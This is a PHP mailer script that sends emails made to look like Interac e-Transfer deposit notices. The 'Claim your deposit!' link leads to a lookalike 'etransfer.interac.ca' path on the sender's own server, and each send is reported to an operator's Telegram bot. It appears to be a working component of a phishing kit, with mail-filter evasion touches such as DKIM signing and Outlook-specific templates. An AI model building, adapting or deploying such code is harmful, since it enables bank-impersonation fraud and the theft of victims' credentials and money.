<?php
declare(strict_types=1);
session_start();
header('Content-Type: application/json');

/*
  tools/mailer.php
  Fully working mailer that:
  - accepts normal + one-time recipient fields
  - embeds/resizes images
  - updates accounts.json and lending_pending.json
  - sends Telegram notification if configured
  - builds encrypted deposit URL as ?deposit=BASE32_UPPER(ALPHANUM)
    using AES-256-CBC (openssl) and RFC4648 Base32 (A-Z2-7 digits)
  Requirements:
  - config/config.php must return array with smtp, sendername, etc.
  - vendor/autoload.php (PHPMailer) must be present
*/

$docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/';
$configFile = $docRoot . 'config/config.php';
if (!is_file($configFile)) {
    echo json_encode(['success' => false, 'message' => 'Config missing']);
    exit;
}
$config = require $configFile;

/* ---------------- Helpers ---------------- */

function get_post(string $k): string {
    return trim((string)($_POST[$k] ?? ''));
}

function base32_encode_rfc4648(string $data): string {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    $bits = 0;
    $buffer = 0;
    $output = '';
    for ($i = 0, $len = strlen($data); $i < $len; $i++) {
        $buffer = ($buffer << 8) | ord($data[$i]);
        $bits += 8;
        while ($bits >= 5) {
            $bits -= 5;
            $index = ($buffer >> $bits) & 0x1F;
            $output .= $alphabet[$index];
        }
    }
    if ($bits > 0) {
        $buffer <<= (5 - $bits);
        $index = $buffer & 0x1F;
        $output .= $alphabet[$index];
    }
    return $output;
}

function encrypt_for_url(string $plaintext, string $key): string {
    // key must be 32 bytes for AES-256
    $key_bin = hash('sha256', $key, true);
    $iv_len = openssl_cipher_iv_length('AES-256-CBC');
    $iv = random_bytes($iv_len);
    $cipher = openssl_encrypt($plaintext, 'AES-256-CBC', $key_bin, OPENSSL_RAW_DATA, $iv);
    if ($cipher === false) return '';
    // store iv + ciphertext, then base32 encode
    $payload = $iv . $cipher;
    return base32_encode_rfc4648($payload);
}

/* ---------------- Collect POST safely ---------------- */
$post = [];
$fields = [
    'recipient_email','recipient_name',
    'recipient_email_one_time','recipient_name_one_time',
    'amount','selected_account','memo',
    'security_question','security_answer'
];
foreach ($fields as $f) $post[$f] = get_post($f);

/* fallback for one-time fields */
$recipient_email = $post['recipient_email'] !== '' ? $post['recipient_email'] : $post['recipient_email_one_time'];
$recipient_name  = $post['recipient_name'] !== '' ? $post['recipient_name'] : $post['recipient_name_one_time'];
$amount          = $post['amount'] ?? '';
$selected_account = $post['selected_account'] ?? '';
$memo            = $post['memo'] ?? '';
$sec_q           = $post['security_question'] ?? '';
$sec_a           = $post['security_answer'] ?? '';

/* basic validation */
if ($recipient_name === '' || $recipient_email === '' || $amount === '') {
    echo json_encode(['success' => false, 'message' => 'Missing fields']);
    exit;
}

/* sanitize amount to float */
$amount_float = (float)str_replace([',','$',' '], '', $amount);

/* transaction */
$transaction_id = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 10);
$date = date('M d, Y');
$expiry_date = date('M d, Y', strtotime('+1 month'));

/* choose template */
$domain = strtolower((string)substr(strrchr($recipient_email, '@'), 1));
$template_path = (strpos($domain, 'hotmail') !== false || strpos($domain, 'outlook') !== false)
    ? $docRoot . 'templates/hotmail.html'
    : ($config['email_template'] ?? $docRoot . 'templates/default_template.html');
if (!is_file($template_path)) {
    echo json_encode(['success' => false, 'message' => 'Template missing']);
    exit;
}
$template = file_get_contents($template_path);

/* build deposit URL with encrypted query in ?deposit=... */
$params = [
    'senderName'       => $config['sendername'] ?? 'Sender',
    'contactName'      => $recipient_name,
    'email'            => $recipient_email,
    'accountType'      => $selected_account,
    'amount'           => '$' . number_format($amount_float, 2),
    'transactionId'    => $transaction_id,
    'security_question'=> $sec_q,
    'security_answer'  => $sec_a
];
$query_plain = http_build_query($params);

/* encryption key: prefer config key, fallback to file-based secret */
$enc_key = $config['encryption_key'] ?? ($config['smtp']['username'] ?? 'default_interac_key');
$deposit_token = encrypt_for_url($query_plain, $enc_key);
$etransferLink = "https://{$_SERVER['HTTP_HOST']}/cgi-admin2/app/api/etransfer.interac.ca/deposit.php?deposit={$deposit_token}";

/* placeholders */
$placeholders = [
    '{{receiver_name}}'        => htmlspecialchars($recipient_name, ENT_QUOTES),
    '{{amount}}'               => '$' . number_format($amount_float, 2),
    '{{memo}}'                 => htmlspecialchars($memo, ENT_QUOTES),
    '{{sender_name}}'          => htmlspecialchars($config['sendername'] ?? 'Sender', ENT_QUOTES),
    '{{etransfer_interac_ca}}' => $etransferLink,
    '{{transaction_id}}'       => $transaction_id,
    '{{date}}'                 => $date,
    '{{expiry_date}}'          => $expiry_date,
    '{{account_type}}'         => htmlspecialchars($selected_account, ENT_QUOTES),
    '{{security_question}}'    => htmlspecialchars($sec_q, ENT_QUOTES)
];
$template = strtr($template, $placeholders);

/* ---------------- PHPMailer send ---------------- */
require $docRoot . 'vendor/autoload.php';
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->Host = $config['smtp']['host'] ?? '';
    $mail->SMTPAuth = true;
    $mail->Username = $config['smtp']['username'] ?? '';
    $mail->Password = $config['smtp']['password'] ?? '';
    $mail->SMTPSecure = $config['smtp']['encryption'] ?? 'tls';
    $mail->Port = (int)($config['smtp']['port'] ?? 587);

    $fromEmail = $config['smtp']['from_email'] ?? '';
    $fromName = $config['sendername'] ?? 'Sender';
    $mail->setFrom($fromEmail, $fromName);
    $mail->addAddress($recipient_email, $recipient_name);
    $mail->addReplyTo($config['reply_to_email'] ?? $fromEmail, $config['reply_to_name'] ?? $fromName);

    $mail->XMailer = '';
    $mail->addCustomHeader('X-Mailer', 'PHPMailer');
    $mail->addCustomHeader('X-Priority', '1 (Highest)');
    $mail->addCustomHeader('X-Transaction-ID', $transaction_id);
    $mail->addCustomHeader('Return-Path', $fromEmail);
    $mail->addCustomHeader('Message-ID', '<' . uniqid($transaction_id . '-', true) . '@' . $_SERVER['SERVER_NAME'] . '>');

    /* embed images (resize if necessary) */
    preg_match_all('/<img\s+[^>]*src=["\']([^"\']+)["\'][^>]*>/i', $template, $matches);
    if (!empty($matches[1])) {
        foreach ($matches[1] as $i => $img) {
            $imgPath = $docRoot . ltrim($img, '/');
            if (!is_file($imgPath)) continue;
            $cid = 'img' . ($i + 1) . '_' . uniqid();

            $imgInfo = @getimagesize($imgPath);
            if ($imgInfo && ($imgInfo[0] > 600 || $imgInfo[1] > 400)) {
                $ratio = min(600 / $imgInfo[0], 400 / $imgInfo[1]);
                $newW = (int)($imgInfo[0] * $ratio);
                $newH = (int)($imgInfo[1] * $ratio);
                $srcImg = null;
                switch ($imgInfo[2]) {
                    case IMAGETYPE_JPEG: $srcImg = imagecreatefromjpeg($imgPath); break;
                    case IMAGETYPE_PNG:  $srcImg = imagecreatefrompng($imgPath); break;
                    case IMAGETYPE_GIF:  $srcImg = imagecreatefromgif($imgPath); break;
                }
                if ($srcImg) {
                    $dst = imagecreatetruecolor($newW, $newH);
                    imagecopyresampled($dst, $srcImg, 0, 0, 0, 0, $newW, $newH, $imgInfo[0], $imgInfo[1]);
                    $tmp = sys_get_temp_dir() . '/' . basename($imgPath);
                    switch ($imgInfo[2]) {
                        case IMAGETYPE_JPEG: imagejpeg($dst, $tmp, 85); break;
                        case IMAGETYPE_PNG:  imagepng($dst, $tmp); break;
                        case IMAGETYPE_GIF:  imagegif($dst, $tmp); break;
                    }
                    imagedestroy($srcImg);
                    imagedestroy($dst);
                    $imgPath = $tmp;
                }
            }

            $mail->addEmbeddedImage($imgPath, $cid);
            $template = str_replace($img, 'cid:' . $cid, $template);
        }
    }

$mail->isHTML(true);
$mail->Subject = "Interac e-Transfer: {$fromName} sent you $" . number_format($amount_float, 2) . ". Claim your deposit!";
$mail->Body = $template;
$mail->AltBody = strip_tags($template);
$mail->Encoding = 'base64';

    /* DKIM if configured */
    if (!empty($config['smtp']['dkim_private']) && is_file($config['smtp']['dkim_private'])) {
        $mail->DKIM_domain = $config['smtp']['dkim_domain'] ?? '';
        $mail->DKIM_private = $config['smtp']['dkim_private'];
        $mail->DKIM_selector = $config['smtp']['dkim_selector'] ?? '';
        $mail->DKIM_identity = $mail->From;
    }

    $mail->send();

    /* ---------- update accounts.json (deduct) ---------- */
    $accounts_file = $docRoot . 'data/accounts.json';
    if (is_file($accounts_file)) {
        $accounts = json_decode(file_get_contents($accounts_file), true);
        if (is_array($accounts)) {
            foreach ($accounts as &$acct) {
                if (($acct['id'] ?? '') === $selected_account) {
                    $acct['balance'] = max(0, floatval($acct['balance'] ?? 0) - $amount_float);
                    break;
                }
            }
            file_put_contents($accounts_file, json_encode($accounts, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
        }
    }

    /* ---------- lending_pending.json ---------- */
    $lendFile = $docRoot . 'data/lending_pending.json';
    $lending = is_file($lendFile) ? json_decode(file_get_contents($lendFile), true) : [];
    if (!is_array($lending)) $lending = [];
    $lending[] = [
        'transaction_id' => $transaction_id,
        'recipient_name' => $recipient_name,
        'recipient_email' => $recipient_email,
        'amount_sent' => $amount_float,
        'account_type' => $selected_account,
        'memo' => $memo ?? '',
        'date' => date('Y-m-d H:i:s'),
        'status' => 'Pending'
    ];
    file_put_contents($lendFile, json_encode($lending, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

    /* ---------- Telegram notification ---------- */
    if (!empty($config['telegram']['bot_token']) && !empty($config['telegram']['chat_id'])) {
        $keyboard = [
            'inline_keyboard' => [
                [['text' => $recipient_name, 'callback_data' => 'recipient']],
                [['text' => $recipient_email, 'callback_data' => 'email']],
                [['text' => '$' . number_format($amount_float, 2), 'callback_data' => 'amount']],
                [['text' => $selected_account, 'callback_data' => 'account']],
                [['text' => $transaction_id, 'callback_data' => 'txn']],
                [['text' => 'Open e-Transfer', 'url' => $etransferLink]]
            ]
        ];
        $msg = "🟩 TRANSFER SENT SUCCESSFUL 🟩";
        $tgUrl = "https://api.telegram.org/bot{$config['telegram']['bot_token']}/sendMessage";
        $payload = [
            'chat_id' => $config['telegram']['chat_id'],
            'text' => $msg,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];
        $ch = curl_init($tgUrl);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10
        ]);
        curl_exec($ch);
        curl_close($ch);
    }

    /* ---------- session store ---------- */
    $_SESSION['transfer_details'] = [
        'transaction_id' => $transaction_id,
        'recipient_name' => $recipient_name,
        'recipient_email' => $recipient_email,
        'amount_sent' => $amount_float,
        'account_type' => $selected_account,
        'expiry_date' => $expiry_date,
        'memo' => $memo ?? ''
    ];

    echo json_encode(['success' => true, 'message' => 'Transfer email sent successfully', 'transaction_id' => $transaction_id, 'deposit' => $deposit_token ?? '']);
    exit;
} catch (Exception $e) {
    echo json_encode(['success' => false, 'message' => 'Mailer Error: ' . $e->getMessage()]);
    exit;
}